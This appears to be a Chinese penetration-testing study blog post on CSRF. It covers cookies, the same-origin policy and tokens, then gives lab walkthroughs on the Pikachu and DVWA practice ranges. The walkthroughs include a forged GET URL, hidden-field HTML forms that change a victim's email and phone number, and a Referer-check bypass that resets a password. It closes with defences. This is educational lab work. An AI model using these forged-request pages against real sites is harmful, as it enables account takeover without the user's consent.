{"title":"渗透测试笔记 - day34 CSRF","date":"2022-03-17T00:00:00.000Z","date_formatted":{"ll":"Mar 17, 2022","L":"03/17/2022","MM-DD":"03-17"},"link":"2022/03/17/渗透测试笔记 - day34 CSRF","updated":"2023-03-17T12:07:41.491Z","content":"<h2 id=\"漏洞成因\">漏洞成因<a title=\"#漏洞成因\" href=\"#漏洞成因\"></a></h2>\n<p>服务器未精确验证请求来源</p>\n<h2 id=\"cookie\">cookie<a title=\"#cookie\" href=\"#cookie\"></a></h2>\n<p>用来证明用户身份。</p>\n<ul>\n<li>用户必须是登陆状态</li>\n<li>同一个浏览器</li>\n<li>同一个网站</li>\n</ul>\n<p>同源策略：</p>\n<ul>\n<li>域名/主机/host/ip相同</li>\n<li>协议相同    http/https</li>\n<li>端口相同</li>\n</ul>\n<h2 id=\"token\">token<a title=\"#token\" href=\"#token\"></a></h2>\n<p>安全令牌，验证请求是否为本人意愿发送。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148264.png\" alt=\"image-20220316194713296\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"csrf客户端请求伪造利用\">CSRF客户端请求伪造利用<a title=\"#csrf客户端请求伪造利用\" href=\"#csrf客户端请求伪造利用\"></a></h2>\n<h3 id=\"get请求\">GET请求<a title=\"#get请求\" href=\"#get请求\"></a></h3>\n<p><strong>Pikachu靶场 CSRF-GET</strong></p>\n<p>登录用户，使浏览器保存cookie</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148644.png\" alt=\"image-20220316213011840\" loading=\"lazy\" class=\"φbp\"></p>\n<p>用burp抓包，获取个人信息修改包。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148730.png\" alt=\"image-20220316221216604\" loading=\"lazy\" class=\"φbp\"></p>\n<p><a href=\"http://xn--payloademail123-u53xi37z2rg7xcus34a.com\">构造payload更改email为123.com</a>：<a href=\"http://127.0.0.1:7790/Pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=chain&amp;email=123.com&amp;submit=submit\" target=\"_blank\">http://127.0.0.1:7790/Pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=chain&amp;email=123.com&amp;submit=submit</a></p>\n<p>用户浏览器访问</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148549.png\" alt=\"image-20220316221552817\" loading=\"lazy\" class=\"φbp\"></p>\n<p>攻击完成。</p>\n<h3 id=\"post请求\">POST请求<a title=\"#post请求\" href=\"#post请求\"></a></h3>\n<p><strong>Pikachu靶场 CSRF-POST</strong></p>\n<p>登录用户，使浏览器保存cookie</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148586.png\" alt=\"image-20220316221652456\" loading=\"lazy\" class=\"φbp\"></p>\n<p>用burp抓包，获取个人信息修改包。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148806.png\" alt=\"image-20220316222340199\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用burp构造攻击利用页面目的将目标手机号修改为123123<img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148196.png\" alt=\"image-20220316222422363\" loading=\"lazy\"></p>\n<p>payload：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\">history.<span class=\"title function_\">pushState</span>(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://127.0.0.1:7790/Pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;sex&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;boy&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phonenum&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;123123&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;add&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;chain&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;email&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;123<span class=\"symbol\">&amp;#46;</span>com1&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;submit&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>部署至C&amp;C服务器</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148146.png\" alt=\"image-20220316224724102\" loading=\"lazy\" class=\"φbp\"></p>\n<p>访问测试</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148895.png\" alt=\"image-20220316224837556\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148776.png\" alt=\"image-20220316224844958\" loading=\"lazy\" class=\"φbp\"></p>\n<p>攻击成功！</p>\n<h3 id=\"referer验证绕过\">referer验证绕过<a title=\"#referer验证绕过\" href=\"#referer验证绕过\"></a></h3>\n<p><strong>DVWA靶场 CSRF-Medium</strong></p>\n<p>同POST请求的CSRF手法，只需在攻击页面中添加refer请求头并使其包含服务器地址。</p>\n<p>抓包</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148102.png\" alt=\"image-20220316230543497\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用burp构造exp 将密码修改为六个1：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;https://54.183.189.40/vulnerabilities/csrf/&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;referrer&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;always&quot;</span>/&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password<span class=\"symbol\">&amp;#95;</span>new&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;111111&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password<span class=\"symbol\">&amp;#95;</span>conf&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;111111&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;Change&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Change&quot;</span> /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>由于refer只检测是否包含服务器域名，所以这里直接将恶意文件名改为主机地址。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148127.png\" alt=\"image-20220316234801835\" loading=\"lazy\" class=\"φbp\"></p>\n<p>访问测试</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148781.png\" alt=\"image-20220316234911499\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112148589.png\" alt=\"image-20220316234919583\" loading=\"lazy\" class=\"φbp\"></p>\n<p>攻击成功。</p>\n<h2 id=\"csrf防御方法\">CSRF防御方法<a title=\"#csrf防御方法\" href=\"#csrf防御方法\"></a></h2>\n<ul>\n<li>增加refer验证</li>\n<li>手机短信验证</li>\n<li>邮箱验证</li>\n<li>token验证</li>\n</ul>\n<h2 id=\"面试tips：\">面试Tips：<a title=\"#面试tips：\" href=\"#面试tips：\"></a></h2>\n<p>XSS和CSRF的区别：</p>\n<p>​\t答：XSS利用的是用户对浏览器的信任。CSRF利用的是服务器对用户浏览器的新人。</p>\n","prev":{"title":"渗透测试笔记 - day35 SSRF","link":"2022/03/18/渗透测试笔记 - day35 SSRF"},"next":{"title":"渗透测试笔记 - day31、32、33 RCE","link":"2022/03/10/渗透测试笔记 - day31、32、33 RCE"},"plink":"https://Lq0ne.github.io/2022/03/17/渗透测试笔记 - day34 CSRF/","toc":[{"id":"漏洞成因","title":"漏洞成因","index":"1"},{"id":"cookie","title":"cookie","index":"2"},{"id":"token","title":"token","index":"3"},{"id":"csrf客户端请求伪造利用","title":"CSRF客户端请求伪造利用","index":"4","children":[{"id":"get请求","title":"GET请求","index":"4.1"},{"id":"post请求","title":"POST请求","index":"4.2"},{"id":"referer验证绕过","title":"referer验证绕过","index":"4.3"}]},{"id":"csrf防御方法","title":"CSRF防御方法","index":"5"},{"id":"面试tips：","title":"面试Tips：","index":"6"}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"March 17, 2022","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2022/03/17/渗透测试笔记 - day34 CSRF/\" title=\"渗透测试笔记 - day34 CSRF\">https://Lq0ne.github.io/2022/03/17/渗透测试笔记 - day34 CSRF/</a>"},"reading_time":"703 words in 5 min"}